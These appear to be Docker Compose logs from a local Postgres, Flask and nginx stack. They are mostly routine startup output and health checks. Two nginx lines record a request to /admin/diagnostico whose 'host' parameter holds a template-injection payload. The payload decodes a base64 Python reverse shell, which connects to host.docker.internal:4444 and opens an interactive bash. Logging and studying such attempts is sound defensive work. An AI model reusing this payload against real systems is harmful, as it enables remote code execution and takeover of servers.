nginx-1  | 2026-06-18T15:30:14.803593264Z /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
db-1       | 2026-06-18T15:30:08.154498975Z 
db-1       | 2026-06-18T15:30:08.155140991Z The database cluster will be initialized with locale "en_US.utf8".
db-1       | 2026-06-18T15:30:08.155156972Z The default database encoding has accordingly been set to "UTF8".
db-1       | 2026-06-18T15:30:08.155159456Z The default text search configuration will be set to "english".
db-1       | 2026-06-18T15:30:08.155161560Z 
db-1       | 2026-06-18T15:30:08.155163514Z Data page checksums are disabled.
db-1       | 2026-06-18T15:30:08.155165258Z 
db-1       | 2026-06-18T15:30:08.155167031Z fixing permissions on existing directory /var/lib/postgresql/data ... ok
db-1       | 2026-06-18T15:30:08.163704232Z creating subdirectories ... ok
db-1       | 2026-06-18T15:30:08.163737626Z selecting dynamic shared memory implementation ... posix
db-1       | 2026-06-18T15:30:08.190420611Z selecting default max_connections ... 100
db-1       | 2026-06-18T15:30:08.229513846Z selecting default shared_buffers ... 128MB
db-1       | 2026-06-18T15:30:08.361126149Z selecting default time zone ... UTC
db-1       | 2026-06-18T15:30:08.364277267Z creating configuration files ... ok
db-1       | 2026-06-18T15:30:08.544361076Z running bootstrap script ... ok
db-1       | 2026-06-18T15:30:08.819722394Z sh: locale: not found
db-1       | 2026-06-18T15:30:08.819967677Z 2026-06-18 15:30:08.819 UTC [35] WARNING:  no usable system locales were found
db-1       | 2026-06-18T15:30:09.337644719Z performing post-bootstrap initialization ... ok
db-1       | 2026-06-18T15:30:10.425842018Z initdb: warning: enabling "trust" authentication for local connections
db-1       | 2026-06-18T15:30:10.425884490Z initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.
db-1       | 2026-06-18T15:30:10.425892011Z syncing data to disk ... ok
db-1       | 2026-06-18T15:30:10.425901259Z 
db-1       | 2026-06-18T15:30:10.425903934Z 
db-1       | 2026-06-18T15:30:10.425906148Z Success. You can now start the database server using:
db-1       | 2026-06-18T15:30:10.425908072Z 
db-1       | 2026-06-18T15:30:10.425909775Z     pg_ctl -D /var/lib/postgresql/data -l logfile start
db-1       | 2026-06-18T15:30:10.425911679Z 
db-1       | 2026-06-18T15:30:10.480736338Z waiting for server to start....2026-06-18 15:30:10.480 UTC [41] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
db-1       | 2026-06-18T15:30:10.483916832Z 2026-06-18 15:30:10.483 UTC [41] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
db-1       | 2026-06-18T15:30:10.493950435Z 2026-06-18 15:30:10.493 UTC [44] LOG:  database system was shut down at 2026-06-18 15:30:09 UTC
db-1       | 2026-06-18T15:30:10.502295856Z 2026-06-18 15:30:10.502 UTC [41] LOG:  database system is ready to accept connections
db-1       | 2026-06-18T15:30:10.551678976Z  done
db-1       | 2026-06-18T15:30:10.551724263Z server started
db-1       | 2026-06-18T15:30:10.683663587Z CREATE DATABASE
db-1       | 2026-06-18T15:30:10.684172677Z 
db-1       | 2026-06-18T15:30:10.684328457Z 
db-1       | 2026-06-18T15:30:10.684335601Z /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/init.sql
db-1       | 2026-06-18T15:30:10.713676384Z CREATE TABLE
db-1       | 2026-06-18T15:30:10.716674498Z INSERT 0 3
db-1       | 2026-06-18T15:30:10.717739949Z 
db-1       | 2026-06-18T15:30:10.717749568Z 
db-1       | 2026-06-18T15:30:10.719052226Z waiting for server to shut down...2026-06-18 15:30:10.718 UTC [41] LOG:  received fast shutdown request
db-1       | 2026-06-18T15:30:10.721940509Z .2026-06-18 15:30:10.721 UTC [41] LOG:  aborting any active transactions
db-1       | 2026-06-18T15:30:10.724382341Z 2026-06-18 15:30:10.724 UTC [41] LOG:  background worker "logical replication launcher" (PID 47) exited with exit code 1
db-1       | 2026-06-18T15:30:10.724562227Z 2026-06-18 15:30:10.724 UTC [42] LOG:  shutting down
db-1       | 2026-06-18T15:30:10.727535804Z 2026-06-18 15:30:10.727 UTC [42] LOG:  checkpoint starting: shutdown immediate
db-1       | 2026-06-18T15:30:11.091017542Z 2026-06-18 15:30:11.090 UTC [42] LOG:  checkpoint complete: wrote 930 buffers (5.7%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.034 s, sync=0.319 s, total=0.367 s; sync files=304, longest=0.003 s, average=0.002 s; distance=4254 kB, estimate=4254 kB
db-1       | 2026-06-18T15:30:11.103746044Z 2026-06-18 15:30:11.103 UTC [41] LOG:  database system is shut down
db-1       | 2026-06-18T15:30:11.120327486Z  done
db-1       | 2026-06-18T15:30:11.120364777Z server stopped
db-1       | 2026-06-18T15:30:11.121719206Z 
db-1       | 2026-06-18T15:30:11.121733613Z PostgreSQL init process complete; ready for start up.
db-1       | 2026-06-18T15:30:11.121737340Z 
db-1       | 2026-06-18T15:30:11.152658017Z 2026-06-18 15:30:11.152 UTC [1] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
db-1       | 2026-06-18T15:30:11.153125066Z 2026-06-18 15:30:11.152 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
db-1       | 2026-06-18T15:30:11.153131679Z 2026-06-18 15:30:11.152 UTC [1] LOG:  listening on IPv6 address "::", port 5432
db-1       | 2026-06-18T15:30:11.159282634Z 2026-06-18 15:30:11.159 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
db-1       | 2026-06-18T15:30:11.169173411Z 2026-06-18 15:30:11.168 UTC [59] LOG:  database system was shut down at 2026-06-18 15:30:11 UTC
db-1       | 2026-06-18T15:30:11.177614597Z 2026-06-18 15:30:11.177 UTC [1] LOG:  database system is ready to accept connections
db-1       | 2026-06-18T15:35:11.163172135Z 2026-06-18 15:35:11.162 UTC [57] LOG:  checkpoint starting: time
db-1       | 2026-06-18T15:35:15.231907734Z 2026-06-18 15:35:15.231 UTC [57] LOG:  checkpoint complete: wrote 43 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled; write=4.023 s, sync=0.019 s, total=4.072 s; sync files=11, longest=0.009 s, average=0.002 s; distance=252 kB, estimate=252 kB
backend-1  | 2026-06-18T15:30:39.057777772Z 127.0.0.1 - - [18/Jun/2026 15:30:39] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:30:44.134872963Z 127.0.0.1 - - [18/Jun/2026 15:30:44] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:30:49.286394899Z 127.0.0.1 - - [18/Jun/2026 15:30:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:30:54.386143061Z 127.0.0.1 - - [18/Jun/2026 15:30:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:30:59.546449802Z 127.0.0.1 - - [18/Jun/2026 15:30:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:04.634771407Z 127.0.0.1 - - [18/Jun/2026 15:31:04] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:09.733490374Z 127.0.0.1 - - [18/Jun/2026 15:31:09] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:14.842884217Z 127.0.0.1 - - [18/Jun/2026 15:31:14] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:19.961424069Z 127.0.0.1 - - [18/Jun/2026 15:31:19] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:25.120804148Z 127.0.0.1 - - [18/Jun/2026 15:31:25] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:30.231555050Z 127.0.0.1 - - [18/Jun/2026 15:31:30] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:35.346198071Z 127.0.0.1 - - [18/Jun/2026 15:31:35] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:40.425594198Z 127.0.0.1 - - [18/Jun/2026 15:31:40] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:45.520711728Z 127.0.0.1 - - [18/Jun/2026 15:31:45] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:50.589194816Z 127.0.0.1 - - [18/Jun/2026 15:31:50] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:31:55.655817553Z 127.0.0.1 - - [18/Jun/2026 15:31:55] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:00.743524198Z 127.0.0.1 - - [18/Jun/2026 15:32:00] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:05.836959445Z 127.0.0.1 - - [18/Jun/2026 15:32:05] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:10.926589390Z 127.0.0.1 - - [18/Jun/2026 15:32:10] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:16.007666799Z 127.0.0.1 - - [18/Jun/2026 15:32:16] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:21.105403698Z 127.0.0.1 - - [18/Jun/2026 15:32:21] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:26.177586122Z 127.0.0.1 - - [18/Jun/2026 15:32:26] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:31.268010856Z 127.0.0.1 - - [18/Jun/2026 15:32:31] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:36.353970999Z 127.0.0.1 - - [18/Jun/2026 15:32:36] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:41.440705045Z 127.0.0.1 - - [18/Jun/2026 15:32:41] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:46.508675447Z 127.0.0.1 - - [18/Jun/2026 15:32:46] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:51.599257235Z 127.0.0.1 - - [18/Jun/2026 15:32:51] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:32:56.674487041Z 127.0.0.1 - - [18/Jun/2026 15:32:56] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:01.732656139Z 127.0.0.1 - - [18/Jun/2026 15:33:01] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:06.801783804Z 127.0.0.1 - - [18/Jun/2026 15:33:06] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:11.985075526Z 127.0.0.1 - - [18/Jun/2026 15:33:11] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:17.085250632Z 127.0.0.1 - - [18/Jun/2026 15:33:17] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:22.201885370Z 127.0.0.1 - - [18/Jun/2026 15:33:22] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:27.300621022Z 127.0.0.1 - - [18/Jun/2026 15:33:27] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:32.424014122Z 127.0.0.1 - - [18/Jun/2026 15:33:32] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:37.538529800Z 127.0.0.1 - - [18/Jun/2026 15:33:37] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:42.657468334Z 127.0.0.1 - - [18/Jun/2026 15:33:42] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:47.790410025Z 127.0.0.1 - - [18/Jun/2026 15:33:47] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:52.902387187Z 127.0.0.1 - - [18/Jun/2026 15:33:52] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:33:58.034131009Z 127.0.0.1 - - [18/Jun/2026 15:33:58] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:03.144802264Z 127.0.0.1 - - [18/Jun/2026 15:34:03] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:08.330926116Z 127.0.0.1 - - [18/Jun/2026 15:34:08] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:13.458605056Z 127.0.0.1 - - [18/Jun/2026 15:34:13] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:18.538013208Z 127.0.0.1 - - [18/Jun/2026 15:34:18] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:20.294802830Z 172.20.0.3 - - [18/Jun/2026:15:34:20 +0000] "GET /empleados HTTP/1.1" 400 237 "-" "curl/8.14.1"
backend-1  | 2026-06-18T15:34:23.615672688Z 127.0.0.1 - - [18/Jun/2026 15:34:23] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:28.708022804Z 127.0.0.1 - - [18/Jun/2026 15:34:28] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:33.797628138Z 127.0.0.1 - - [18/Jun/2026 15:34:33] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:38.878586466Z 127.0.0.1 - - [18/Jun/2026 15:34:38] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:43.956111019Z 127.0.0.1 - - [18/Jun/2026 15:34:43] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:49.042785891Z 127.0.0.1 - - [18/Jun/2026 15:34:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:54.142582660Z 127.0.0.1 - - [18/Jun/2026 15:34:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:34:59.226559926Z 127.0.0.1 - - [18/Jun/2026 15:34:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:04.309947888Z 127.0.0.1 - - [18/Jun/2026 15:35:04] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:09.388522904Z 127.0.0.1 - - [18/Jun/2026 15:35:09] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:14.478881996Z 127.0.0.1 - - [18/Jun/2026 15:35:14] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:19.555170316Z 127.0.0.1 - - [18/Jun/2026 15:35:19] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:24.627278491Z 127.0.0.1 - - [18/Jun/2026 15:35:24] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:29.702638978Z 127.0.0.1 - - [18/Jun/2026 15:35:29] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:34.808810627Z 127.0.0.1 - - [18/Jun/2026 15:35:34] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:39.901557634Z 127.0.0.1 - - [18/Jun/2026 15:35:39] "GET /health HTTP/1.1" 200 -
nginx-1    | 2026-06-18T15:31:48.908079163Z 2026/06/18 15:31:48 [error] 30#30: *1 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.19.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.19.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico"
nginx-1    | 2026-06-18T15:31:48.908385023Z 172.19.0.1 - - [18/Jun/2026:15:31:48 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
backend-1  | 2026-06-18T15:35:45.001720566Z 127.0.0.1 - - [18/Jun/2026 15:35:45] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:50.121336088Z 127.0.0.1 - - [18/Jun/2026 15:35:50] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:35:55.215092491Z 127.0.0.1 - - [18/Jun/2026 15:35:55] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-18T15:36:00.306888961Z 127.0.0.1 - - [18/Jun/2026 15:36:00] "GET /health HTTP/1.1" 200 -
webapp-1   | 2026-06-18T15:30:15.040655220Z  * Serving Flask app 'app'
webapp-1   | 2026-06-18T15:30:15.040739713Z  * Debug mode: off
webapp-1   | 2026-06-18T15:30:15.045040231Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
webapp-1   | 2026-06-18T15:30:15.045070779Z  * Running on all addresses (0.0.0.0)
webapp-1   | 2026-06-18T15:30:15.045074026Z  * Running on http://127.0.0.1:5000
webapp-1   | 2026-06-18T15:30:15.045076470Z  * Running on http://172.20.0.3:5000
webapp-1   | 2026-06-18T15:30:15.045078875Z [33mPress CTRL+C to quit[0m
